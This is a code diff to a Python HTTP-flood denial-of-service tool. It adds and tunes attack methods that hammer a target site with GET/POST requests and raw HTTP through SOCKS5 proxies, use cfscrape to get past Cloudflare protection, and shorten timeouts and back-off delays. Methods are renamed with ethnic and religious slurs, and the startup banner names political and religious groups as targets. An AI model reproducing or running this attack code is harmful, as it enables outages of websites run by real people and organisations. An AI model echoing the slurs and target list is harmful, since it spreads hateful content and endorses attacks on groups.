@@ -128,7 +128,7 @@ def exit(*message):
 
 class Methods:
     LAYER7_METHODS: Set[str] = {
-        "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "FUNDIE", 
+        "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "RAGHEAD", "PAPIST", "TANKIE_SPECIAL", "KACAP",
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
@@ -168,6 +168,12 @@ class BlackLists:
         "https://www.jcp.or.jp/",
 
     ]
+
+    UNITED_NATIONS = [
+    ]
+
+
+
 
 class Counter:
     def __init__(self, value=0):
@@ -715,10 +721,13 @@ class HttpFlood(Thread):
             "BOT": self.BOT,
             "APACHE": self.APACHE,
             "BYPASS": self.BYPASS,
+            "KACAP": self.KACAP,
             "DGB": self.DGB,
             "OVH": self.OVH,
             "AVB": self.AVB,
-            "FUNDIE": self.FUNDIE,
+            "RAGHEAD": self.RAGHEAD,
+            "TANKIE_SPECIAL": self.TANKIE_SPECIAL,
+            "PAPIST" : self.PAPIST,
             "STRESS": self.STRESS,
             "DYN": self.DYN,
             "SLOW": self.SLOW,
@@ -1023,12 +1032,12 @@ class HttpFlood(Thread):
                 for _ in range(self._rpc):
                     if pro:
                         with s.get(str(self._target) + "?=" + str(random.randint(0,20000)),
-                                   proxies=pro.asRequest(), timeout=45) as res:
+                                   proxies=pro.asRequest(), timeout=15) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                             continue
             except:
-                sleep(random.randint(20,40))
+                sleep(random.randint(10,15))
         Tools.safe_close(s)
 
     def CFTANKIE2(self):
@@ -1043,15 +1052,26 @@ class HttpFlood(Thread):
         with suppress(Exception), cfscrape.create_scraper() as s:
             try:
                 for _ in range(self._rpc):
-                    with s.get(str(self._target), timeout=60) as res:
+                    with s.get(str(self._target), timeout=15) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.post(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=45) as res:
+                    with s.post(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=15) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
             except:
-                sleep(random.randint(20,40))
+                sleep(random.randint(10,15))
         Tools.safe_close(s)
+
+    def TANKIE_SPECIAL(self):
+        attack_method = int(random.randint(0,2))
+
+        if attack_method == 0:
+            self.PAPIST()
+        elif  attack_method == 1:
+            self.CFTANKIE()
+        elif  attack_method == 2:
+            self.CFTANKIE2()
+
 
     def CFFUNDIE(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1067,9 +1087,10 @@ class HttpFlood(Thread):
         "Cache-Control" : "max-age=0",
         "Upgrade-Insecure-Requests" : "1",
         "User-Agent" : randchoice(self._useragents),
-        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
         "Accept-Encoding" : "gzip, deflate",
-        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
+        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8",
+        "Sec-Fetch-Site": "same-origin"}
 
         s = None
         with suppress(Exception), cfscrape.create_scraper() as s:
@@ -1086,7 +1107,7 @@ class HttpFlood(Thread):
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
             except:
-                sleep(random.randint(20,40))
+                sleep(random.randint(10,15))
         Tools.safe_close(s)
 
     def CFFUNDIE2(self):
@@ -1101,9 +1122,10 @@ class HttpFlood(Thread):
         "Cache-Control" : "max-age=0",
         "Upgrade-Insecure-Requests" : "1",
         "User-Agent" : randchoice(self._useragents),
-        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
         "Accept-Encoding" : "gzip, deflate",
-        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
+        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8",
+        "Sec-Fetch-Site": "same-origin"}
 
         with suppress(Exception), cfscrape.create_scraper() as s:
             try:
@@ -1117,7 +1139,7 @@ class HttpFlood(Thread):
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
             except:
-                sleep(random.randint(20,40))
+                sleep(random.randint(10,15))
         Tools.safe_close(s)
 
     def CFB(self):
@@ -1161,7 +1183,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
-    def FUNDIE(self):
+    def RAGHEAD(self):
         # AVB + SLOW
         payload: bytes = self.generate_payload()
         s = None
@@ -1193,41 +1215,38 @@ class HttpFlood(Thread):
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
 
-    def SKY(self):
+    def PAPIST(self):
         global REQUESTS_SENT, BYTES_SEND
         pro = None
         if self._proxies:
             pro = randchoice(self._proxies)
-
-        proxy = random.choice(proxies).strip().split(":")
-        timelol = time.time() + int(timer)
+      
+        proxy = pro.ip_port().split(":")
         req =  "GET / HTTP/1.1\r\nHost: " + str(self._host) + "\r\n"
         req += "Cache-Control: no-cache\r\n"
         req += "User-Agent: " + randchoice(self._useragents) + "\r\n"
-        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+        req += "Accept: text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
         req += "Sec-Fetch-Site: same-origin\r\n"
         req += "Sec-GPC: 1\r\n"
         req += "Sec-Fetch-Mode: navigate\r\n"
         req += "Sec-Fetch-Dest: document\r\n"
         req += "Upgrade-Insecure-Requests: 1\r\n"
         req += "Connection: Keep-Alive\r\n\r\n"
-        while time.time() < timelol:
+        try:
+            s = socks.socksocket()
+            s.connect((str(self._host), int(443)))
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
             try:
-                s = socks.socksocket()
-                s.connect((str(urlparse(url).netloc), int(443)))
-                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-                ctx = ssl.SSLContext()
-                s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
-                s.send(str.encode(req))
-                try:
-                    for _ in range(100):
-                        s.send(str.encode(req))
-                        s.send(str.encode(req))
-                except:
-                    s.close()
+                for _ in range(self._rpc):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
             except:
                 s.close()
-
+        except:
+            s.close()
 
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1299,6 +1318,30 @@ class HttpFlood(Thread):
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
+
+    def KACAP(self):
+        global REQUESTS_SENT, BYTES_SEND
+
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
+        headersx={"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Cache-Control" : "max-age=0",
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Accept-Encoding" : "gzip, compress, br, deflate",
+        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
+
+        # Attacking
+        try:
+           for _ in range(self._rpc):
+               requests.get(url, headers=headersx)
+               requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
+        except:
+            sleep(random.randint(10,15))
 
     def GSB(self):
         payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
@@ -1900,9 +1943,13 @@ if __name__ == '__main__':
         with suppress(IndexError):
 
             print("This tool is against the tankie, ultranationalist, religious right and militarist")
-            print("Only for kacap, tankie, FUNDIE, papist, fundie, kach, hindutva, homophobia, junta and their allies")
+            print("Only for kacap, tankie, raghead, papist, fundie, kach, hindutva, homophobia, junta and their allies")
             print("Do not attack Fatah, PKK, National Unity Government and other resistance group")
-            print("This tool is against the oppression, the harmful propaganda and")
+            print("This tool is against the oppression, the harmful propaganda and the cyber attack")
+            print("Do not abuse this program, this is the final method")
+            print("if you just accuse the corruptiopn of the goverment, please use OSINT tools.")
+            print("For example maigret, emploLeaks and so on")
+            print("if you live in the democratic state, do not use this tool. you have an inviolence method")
 
             one = argv[1].upper()
 
